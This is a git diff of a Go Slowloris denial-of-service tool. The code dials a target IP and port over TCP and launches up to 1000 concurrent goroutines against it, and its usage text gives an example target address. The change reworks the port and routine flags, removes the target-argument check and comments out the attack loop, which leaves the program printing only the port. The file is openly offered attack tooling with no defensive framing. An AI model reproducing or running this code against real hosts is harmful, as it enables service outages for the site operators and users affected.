@@ -5,7 +5,6 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
-	"os"
 	"sync"
 	"time"
 )
@@ -13,8 +12,8 @@ import (
 const timeOut = 3
 const sleep = 15
 
-var port = flag.String("p", "80", "to open port on the targeted machine")
-var routines = flag.Int("r", 1000, "the number of concurent routines")
+var port string
+var routines int
 var wg sync.WaitGroup
 
 var headers = []string{
@@ -26,11 +25,11 @@ var headers = []string{
 
 func usage() {
 	fmt.Printf("You need to specify the ip of the target machine\n")
-	fmt.Print("An example is 195.17.56.213 -p 8080 \n")
+	fmt.Print("An example is -target 195.17.56.213 -p 8080 \n")
 	flag.PrintDefaults()
 }
 func slowLoris(target string, indx int) {
-	conn, err := net.DialTimeout("tcp", target+":"+*port, timeOut*time.Second)
+	conn, err := net.DialTimeout("tcp", target+":"+port, timeOut*time.Second)
 	if err != nil {
 		fmt.Printf("Couldn't connect to %s\n", target)
 		wg.Done()
@@ -57,16 +56,15 @@ func slowLoris(target string, indx int) {
 }
 func main() {
 	flag.Usage = usage
+	flag.StringVar(&port, "p", "80", "the port of the targeted machine")
+	flag.IntVar(&routines, "r", 1000, "number of concurent routines")
 	flag.Parse()
-	if flag.NArg() < 1 {
-		flag.Usage()
-		os.Exit(0)
-	}
-	target := flag.Arg(0)
-	fmt.Printf("Attacking %s with %v routines \n", target, *routines)
+	fmt.Println(port)
+
+	/*fmt.Printf("Attacking %s with %v routines \n", target, *routines)
 	for i := 1; i <= *routines; i++ {
 		wg.Add(1)
 		go slowLoris(target, i)
 	}
-	wg.Wait()
+	wg.Wait()*/
 }
